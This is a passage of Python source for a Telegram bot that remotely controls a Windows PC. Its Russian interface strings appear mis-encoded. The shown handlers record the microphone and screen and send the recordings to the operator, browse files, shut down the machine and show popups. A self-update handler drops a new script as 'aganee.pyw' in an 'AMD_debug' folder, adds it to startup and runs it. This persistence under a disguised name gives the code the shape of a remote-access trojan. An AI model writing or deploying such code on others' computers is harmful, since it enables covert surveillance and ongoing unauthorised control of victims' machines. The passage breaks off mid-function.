    bot.edit_message_text('–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞.', call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'shutdown:yes')
def shutdown_yes_callback(call):
    bot.edit_message_text('–í—ã–∫–ª—é—á–µ–Ω–∏–µ...', call.message.chat.id, call.message.message_id)
    shutdown_with_display_off('shutdown /s /t 0')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'shutdown:no')
def shutdown_no_callback(call):
    bot.edit_message_text('–í—ã–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–∞.', call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

# --- –ú–µ—Ö–∞–Ω–∏–∑–º –æ—Ç–º–µ–Ω—ã –¥–ª—è next_step_handler ---

# –í callback-–æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∞—Ö –æ—Ç–º–µ–Ω—ã:
@bot.callback_query_handler(func=lambda call: call.data == 'url:cancel')
def url_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'runfile:cancel')
def runfile_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

# –í –∫–∞–∂–¥–æ–º next_step_handler:

# –°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –≤–æ–∑–º–æ–∂–Ω—ã—Ö –∫–Ω–æ–ø–æ–∫ (–∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤ handle_path_message)
ALL_MAIN_MENU_BUTTONS = [
    'üñº –°–∫—Ä–∏–Ω—à–æ—Ç', 'üóÇ –ü—Ä–æ—Ü–µ—Å—Å—ã', 'üíª Cmd', 'üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö',
    '‚èπ –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö', 'üìÇ –í—ã–ø–æ–ª–Ω–∏—Ç—å —Ñ–∞–π–ª', 'üóÇ –ü—Ä–æ–≤–æ–¥–Ω–∏–∫', 'üåê –°—Å—ã–ª–∫–∞',
    'üé§ –ó–∞–ø–∏—Å–∞—Ç—å –º–∏–∫—Ä–æ—Ñ–æ–Ω', 'üé¨ –ó–∞–ø–∏—Å–∞—Ç—å GIF', 'üí¨ Popup —Å–æ–æ–±—â–µ–Ω–∏–µ', 'üîä –í–æ—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –∑–≤—É–∫', 'üîÑ Update', '‚ûñ –°–≤–µ—Ä–Ω—É—Ç—å –≤—Å—ë'
]

# --- –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ: handle_path_message –Ω–µ –¥–æ–ª–∂–µ–Ω –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞—Ç—å –æ—Ç–≤–µ—Ç—ã –Ω–∞ –¥–∏–∞–ª–æ–≥–∏ ---
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and not message.text.startswith('/') and not hasattr(message, 'reply_markup'))
def handle_path_message(message):
    if not message.text or not message.text.strip():
        return  # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –ø—É—Å—Ç—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è
    if message.text in ALL_MAIN_MENU_BUTTONS:
        return
    path = message.text.strip().strip('"')
    if not os.path.exists(path):
        bot.send_message(message.chat.id, '‚ùå –ü—É—Ç—å –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç.')
        return
    user_id = message.from_user.id
    if os.path.isdir(path):
        user_paths[user_id] = {'path': path, 'page': 0, 'map': {}, 'show_drives': False}
        show_directory(message.chat.id, user_id)
    else:
        # –î–æ–±–∞–≤–ª—è–µ–º —Ñ–∞–π–ª –≤–æ –≤—Ä–µ–º–µ–Ω–Ω—É—é –∫–∞—Ä—Ç—É –∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –º–µ–Ω—é –¥–µ–π—Å—Ç–≤–∏–π
        parent = os.path.dirname(path)
        user_paths[user_id] = {'path': parent, 'page': 0, 'map': {'filemsg': path}, 'show_drives': False}
        show_item_actions(message.chat.id, user_id, 'filemsg', is_dir=False)

from telebot.types import ReplyKeyboardRemove

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '‚ûñ –°–≤–µ—Ä–Ω—É—Ç—å –≤—Å—ë')
def minimize_all_handler(message):
    import ctypes
    user32 = ctypes.windll.user32
    # Win key down
    user32.keybd_event(0x5B, 0, 0, 0)
    # M key down
    user32.keybd_event(0x4D, 0, 0, 0)
    # M key up
    user32.keybd_event(0x4D, 0, 2, 0)
    # Win key up
    user32.keybd_event(0x5B, 0, 2, 0)
    bot.send_message(message.chat.id, '‚ûñ –í—Å–µ –æ–∫–Ω–∞ —Å–≤–µ—Ä–Ω—É—Ç—ã!')

# –í–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –∑–≤—É–∫–∞ (MP3)
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üîä –í–æ—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –∑–≤—É–∫')
def play_sound_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data='sound:cancel'))
    msg = bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ MP3-—Ñ–∞–π–ª (–∫–∞–∫ –∞—É–¥–∏–æ –∏–ª–∏ –∫–∞–∫ –¥–æ–∫—É–º–µ–Ω—Ç) –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è.', reply_markup=markup)
    bot.register_next_step_handler(msg, play_sound_receive_handler)

def _play_sound_async(file_path):
    try:
        import winsound
        import os
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞
        file_ext = os.path.splitext(file_path)[1].lower()
        
        if file_ext == '.wav':
            # –î–ª—è WAV —Ñ–∞–π–ª–æ–≤ –∏—Å–ø–æ–ª—å–∑—É–µ–º winsound
            winsound.PlaySound(file_path, winsound.SND_FILENAME)
        else:
            # –î–ª—è MP3 –∏ –¥—Ä—É–≥–∏—Ö —Ñ–æ—Ä–º–∞—Ç–æ–≤ –∏—Å–ø–æ–ª—å–∑—É–µ–º pygame
            try:
                import pygame
                pygame.mixer.init()
                pygame.mixer.music.load(file_path)
                pygame.mixer.music.play()
                
                # –ñ–¥–µ–º –ø–æ–∫–∞ –º—É–∑—ã–∫–∞ –Ω–µ –∑–∞–∫–æ–Ω—á–∏—Ç—Å—è
                while pygame.mixer.music.get_busy():
                    import time
                    time.sleep(0.1)
                    
                pygame.mixer.quit()
            except:
                # –ï—Å–ª–∏ pygame –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –∏—Å–ø–æ–ª—å–∑—É–µ–º —Å–∏—Å—Ç–µ–º–Ω–æ–µ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ
                subprocess.Popen(["start", "", file_path], shell=True,
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def play_sound_receive_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    file_id = None
    file_name = None
    mime_type = None
    # –ü—Ä–∏–Ω–∏–º–∞–µ–º –∫–∞–∫ –¥–æ–∫—É–º–µ–Ω—Ç
    if message.document:
        file_id = message.document.file_id
        file_name = (message.document.file_name or '').lower()
        mime_type = (message.document.mime_type or '').lower()
    # –ò–ª–∏ –∫–∞–∫ –∞—É–¥–∏–æ (–º—É–∑—ã–∫–∞)
    elif hasattr(message, 'audio') and message.audio:
        file_id = message.audio.file_id
        file_name = (getattr(message.audio, 'file_name', '') or '').lower()
        mime_type = (getattr(message.audio, 'mime_type', '') or '').lower()
    else:
        bot.send_message(message.chat.id, '‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ MP3 –∫–∞–∫ –∞—É–¥–∏–æ –∏–ª–∏ –¥–æ–∫—É–º–µ–Ω—Ç.')
        return
    try:
        is_mp3 = False
        if file_name and file_name.endswith('.mp3'):
            is_mp3 = True
        if not is_mp3 and mime_type == 'audio/mpeg':
            is_mp3 = True
        if not is_mp3:
            bot.send_message(message.chat.id, '‚ùå –ù—É–∂–µ–Ω MP3-—Ñ–∞–π–ª (—Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ .mp3 –∏–ª–∏ MIME audio/mpeg).')
            return

        file_info = bot.get_file(file_id)
        if not file_info.file_path:
            bot.send_message(message.chat.id, '‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É.')
            return
        data = bot.download_file(file_info.file_path)
        # —Å–æ—Ö—Ä–∞–Ω—è–µ–º –≤–æ –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
        tmpdir = tempfile.mkdtemp()
        local_name = os.path.basename(file_name) if file_name else 'sound.mp3'
        if not local_name.endswith('.mp3'):
            local_name += '.mp3'
        local_path = os.path.join(tmpdir, local_name)
        with open(local_path, 'wb') as f:
            f.write(data)
        bot.send_message(message.chat.id, f'üîä –í–æ—Å–ø—Ä–æ–∏–∑–≤–æ–∂—É –∑–≤—É–∫...')
        th = threading.Thread(target=_play_sound_async, args=(local_path,), daemon=True)
        th.start()
    except Exception as e:
        bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–∏: {e}')

@bot.callback_query_handler(func=lambda call: call.data == 'sound:cancel')
def sound_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∑–∞–ø–∏—Å–∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üé§ –ó–∞–ø–∏—Å–∞—Ç—å –º–∏–∫—Ä–æ—Ñ–æ–Ω')
def microphone_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data='mic:cancel'))
    msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –≤—Ä–µ–º—è –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (–æ—Ç 1 –¥–æ 60):', reply_markup=markup)
    bot.register_next_step_handler(msg, microphone_record_handler)

def microphone_record_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    
    try:
        duration = int(message.text.strip())
        if duration < 1 or duration > 60:
            bot.send_message(message.chat.id, '‚ùå –í—Ä–µ–º—è –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –æ—Ç 1 –¥–æ 60 —Å–µ–∫—É–Ω–¥.')
            return
    except ValueError:
        bot.send_message(message.chat.id, '‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ.')
        return
    
    bot.send_message(message.chat.id, f'üé§ –ù–∞—á–∏–Ω–∞—é –∑–∞–ø–∏—Å—å –Ω–∞ {duration} —Å–µ–∫—É–Ω–¥...')
    
    try:
        # –ü–∞—Ä–∞–º–µ—Ç—Ä—ã –∑–∞–ø–∏—Å–∏
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        
        # –°–æ–∑–¥–∞–µ–º –æ–±—ä–µ–∫—Ç PyAudio
        audio = pyaudio.PyAudio()
        
        # –û—Ç–∫—Ä—ã–≤–∞–µ–º –ø–æ—Ç–æ–∫ –¥–ª—è –∑–∞–ø–∏—Å–∏
        stream = audio.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)
        
        frames = []
        
        # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –∞—É–¥–∏–æ
        for i in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∑–∞–ø–∏—Å—å
        stream.stop_stream()
        stream.close()
        audio.terminate()
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª
        with tempfile.NamedTemporaryFile(suffix='.wav', delete=False) as tmpfile:
            wf = wave.open(tmpfile.name, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≥–æ–ª–æ—Å–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
            with open(tmpfile.name, 'rb') as voice_file:
                bot.send_voice(message.chat.id, voice_file, duration=duration)
        
        # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª –ø–æ—Å–ª–µ –∑–∞–∫—Ä—ã—Ç–∏—è –≤—Å–µ—Ö —Ñ–∞–π–ª–æ–≤—ã—Ö –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–æ–≤
        try:
            os.unlink(tmpfile.name)
        except Exception:
            pass  # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ —É–¥–∞–ª–µ–Ω–∏—è
        
        bot.send_message(message.chat.id, f'‚úÖ –ó–∞–ø–∏—Å—å –∑–∞–≤–µ—Ä—à–µ–Ω–∞! ({duration} —Å–µ–∫)')
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
        user_nick = get_user_nick(message.from_user.id)
        show_notification("–ó–∞–ø–∏—Å—å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞", f"{user_nick} –∑–∞–ø–∏—Å–∞–ª {duration} —Å–µ–∫", "üé§")
        
    except Exception as e:
        bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø–∏—Å–∏: {str(e)}')

@bot.callback_query_handler(func=lambda call: call.data == 'mic:cancel')
def mic_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∑–∞–ø–∏—Å–∏ GIF
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üé¨ –ó–∞–ø–∏—Å–∞—Ç—å GIF')
def gif_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data='gif:cancel'))
    msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –≤—Ä–µ–º—è –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (–æ—Ç 1 –¥–æ 60):', reply_markup=markup)
    bot.register_next_step_handler(msg, gif_record_handler)

def gif_record_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    
    try:
        duration = int(message.text.strip())
        if duration < 1 or duration > 60:
            bot.send_message(message.chat.id, '‚ùå –í—Ä–µ–º—è –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –æ—Ç 1 –¥–æ 60 —Å–µ–∫—É–Ω–¥.')
            return
    except ValueError:
        bot.send_message(message.chat.id, '‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–µ —á–∏—Å–ª–æ.')
        return
    
    bot.send_message(message.chat.id, f'üé¨ –ù–∞—á–∏–Ω–∞—é –∑–∞–ø–∏—Å—å GIF –Ω–∞ {duration} —Å–µ–∫—É–Ω–¥...')
    
    try:
        # –ü–∞—Ä–∞–º–µ—Ç—Ä—ã –∑–∞–ø–∏—Å–∏
        fps = 6  # 6 –∫–∞–¥—Ä–æ–≤ –≤ —Å–µ–∫—É–Ω–¥—É - —Ö–æ—Ä–æ—à–∏–π –±–∞–ª–∞–Ω—Å –∫–∞—á–µ—Å—Ç–≤–∞ –∏ —Ä–∞–∑–º–µ—Ä–∞
        total_frames = duration * fps
        frame_interval = 1.0 / fps
        
        # –°–æ–∑–¥–∞–µ–º –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–∞–ø–∫—É –¥–ª—è –∫–∞–¥—Ä–æ–≤
        temp_dir = tempfile.mkdtemp()
        frames = []
        
        # –î–µ–ª–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç—ã
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # –æ—Å–Ω–æ–≤–Ω–æ–π –º–æ–Ω–∏—Ç–æ—Ä
            
            for i in range(total_frames):
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ—Ç–º–µ–Ω—É
                if user_paths.get(user_id, {}).get('cancelled'):
                    user_paths[user_id]['cancelled'] = False
                    # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–∞–ø–∫—É
                    import shutil
                    shutil.rmtree(temp_dir, ignore_errors=True)
                    return
                
                # –î–µ–ª–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç
                screenshot = sct.grab(monitor)
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                
                # –û–ø—Ç–∏–º–∏–∑–∏—Ä—É–µ–º —Ä–∞–∑–º–µ—Ä –¥–ª—è –±–∞–ª–∞–Ω—Å–∞ –∫–∞—á–µ—Å—Ç–≤–∞ –∏ —Ä–∞–∑–º–µ—Ä–∞ —Ñ–∞–π–ª–∞
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø—Ä–æ–ø–æ—Ä—Ü–∏–∏, –¥–µ–ª–∞–µ–º —Å—Ä–µ–¥–Ω–∏–π —Ä–∞–∑–º–µ—Ä –¥–ª—è —Ö–æ—Ä–æ—à–µ–≥–æ –∫–∞—á–µ—Å—Ç–≤–∞
                width, height = img.size
                if width > 600:  # –ï—Å–ª–∏ —à–∏—Ä–∏–Ω–∞ –±–æ–ª—å—à–µ 600px
                    ratio = 600 / width
                    new_width = 600
                    new_height = int(height * ratio)
                    img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∫–∞–¥—Ä —Å –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–µ–π
                frame_path = os.path.join(temp_dir, f"frame_{i:03d}.png")
                img.save(frame_path, "PNG", optimize=True, compress_level=6)
                frames.append(frame_path)
                
                # –ñ–¥–µ–º –¥–æ —Å–ª–µ–¥—É—é—â–µ–≥–æ –∫–∞–¥—Ä–∞
                time.sleep(frame_interval)
        
        # –°–æ–∑–¥–∞–µ–º GIF
        if frames:
            gif_path = os.path.join(temp_dir, "recording.gif")
            
            # –ó–∞–≥—Ä—É–∂–∞–µ–º –ø–µ—Ä–≤—ã–π –∫–∞–¥—Ä
            first_frame = Image.open(frames[0])
            
            # –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ –ø–∞–ª–∏—Ç—Ä—É —Å —Ö–æ—Ä–æ—à–∏–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ–º —Ü–≤–µ—Ç–æ–≤ –¥–ª—è –∫–∞—á–µ—Å—Ç–≤–∞
            first_frame = first_frame.convert('P', palette=Image.ADAPTIVE, colors=200)
            
            # –°–æ–∑–¥–∞–µ–º GIF —Å —É–ª—É—á—à–µ–Ω–Ω—ã–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ –¥–ª—è —Ö–æ—Ä–æ—à–µ–≥–æ –∫–∞—á–µ—Å—Ç–≤–∞
            first_frame.save(
                gif_path,
                save_all=True,
                append_images=[Image.open(frame).convert('P', palette=Image.ADAPTIVE, colors=200) for frame in frames[1:]],
                duration=int(1000 / fps),  # –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∫–∞–¥—Ä–∞ –≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥–∞—Ö
                loop=0,  # –±–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª
                optimize=True,  # –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è
                quality=85,  # —Ö–æ—Ä–æ—à–µ–µ –∫–∞—á–µ—Å—Ç–≤–æ
                method=6  # –ª—É—á—à–∏–π –º–µ—Ç–æ–¥ —Å–∂–∞—Ç–∏—è
            )
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º GIF
            with open(gif_path, 'rb') as gif_file:
                bot.send_document(message.chat.id, gif_file, caption=f'üé¨ GIF –∑–∞–ø–∏—Å–∞–Ω! ({duration} —Å–µ–∫, {len(frames)} –∫–∞–¥—Ä–æ–≤)')
            
            # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
            
            bot.send_message(message.chat.id, f'‚úÖ GIF —Å–æ–∑–¥–∞–Ω! ({duration} —Å–µ–∫)')
            
            # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
            user_nick = get_user_nick(message.from_user.id)
            show_notification("–ó–∞–ø–∏—Å—å GIF", f"{user_nick} –∑–∞–ø–∏—Å–∞–ª GIF {duration} —Å–µ–∫", "üé¨")
        else:
            bot.send_message(message.chat.id, '‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –∫–∞–¥—Ä—ã –¥–ª—è GIF.')
            
    except Exception as e:
        bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ GIF: {str(e)}')
        # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–∞–ø–∫—É –≤ —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏
        try:
            import shutil
            shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass

@bot.callback_query_handler(func=lambda call: call.data == 'gif:cancel')
def gif_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ popup —Å–æ–æ–±—â–µ–Ω–∏—è
@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üí¨ Popup —Å–æ–æ–±—â–µ–Ω–∏–µ')
def popup_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data='popup:cancel'))
    msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è popup —Å–æ–æ–±—â–µ–Ω–∏—è:', reply_markup=markup)
    bot.register_next_step_handler(msg, popup_show_handler)

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üîÑ Update')
def update_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data='update:cancel'))
    msg = bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ –Ω–æ–≤—ã–π —Ñ–∞–π–ª –±–æ—Ç–∞ (.py –∏–ª–∏ .pyw):', reply_markup=markup)
    bot.register_next_step_handler(msg, update_receive_handler)

def update_receive_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    
    if not message.document:
        bot.send_message(message.chat.id, '‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –∫–∞–∫ –¥–æ–∫—É–º–µ–Ω—Ç.')
        return
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ —Ñ–∞–π–ª–∞
    file_name = message.document.file_name.lower()
    if not (file_name.endswith('.py') or file_name.endswith('.pyw')):
        bot.send_message(message.chat.id, '‚ùå –§–∞–π–ª –¥–æ–ª–∂–µ–Ω –∏–º–µ—Ç—å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ .py –∏–ª–∏ .pyw')
        return
    
    try:
        bot.send_message(message.chat.id, 'üîÑ –ù–∞—á–∏–Ω–∞—é –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ...')
        
        # –°–∫–∞—á–∏–≤–∞–µ–º –Ω–æ–≤—ã–π —Ñ–∞–π–ª
        file_info = bot.get_file(message.document.file_id)
        if not file_info.file_path:
            bot.send_message(message.chat.id, '‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É.')
            return
        
        downloaded_file = bot.download_file(file_info.file_path)
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–≤—ã–π —Ñ–∞–π–ª –≤ AMD_debug
        new_file_path = os.path.join(AMD_DEBUG_PATH, "aganee.pyw")
        
        with open(new_file_path, 'wb') as f:
            f.write(downloaded_file)
        
        bot.send_message(message.chat.id, f'‚úÖ –ù–æ–≤—ã–π —Ñ–∞–π–ª —Å–æ—Ö—Ä–∞–Ω–µ–Ω: {new_file_path}')
        
        # –û–±–Ω–æ–≤–ª—è–µ–º –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫
        cleanup_startup_links()
        create_startup_link(new_file_path)
        
        bot.send_message(message.chat.id, '‚úÖ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ! –ù–æ–≤—ã–π –±–æ—Ç –±—É–¥–µ—Ç –∑–∞–ø—É—â–µ–Ω –ø—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–π –∑–∞–≥—Ä—É–∑–∫–µ —Å–∏—Å—Ç–µ–º—ã.')
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –Ω–æ–≤—ã–π —Ñ–∞–π–ª
        try:
            subprocess.Popen([sys.executable, new_file_path])
            bot.send_message(message.chat.id, 'üöÄ –ù–æ–≤—ã–π –±–æ—Ç –∑–∞–ø—É—â–µ–Ω!')
        except Exception as e:
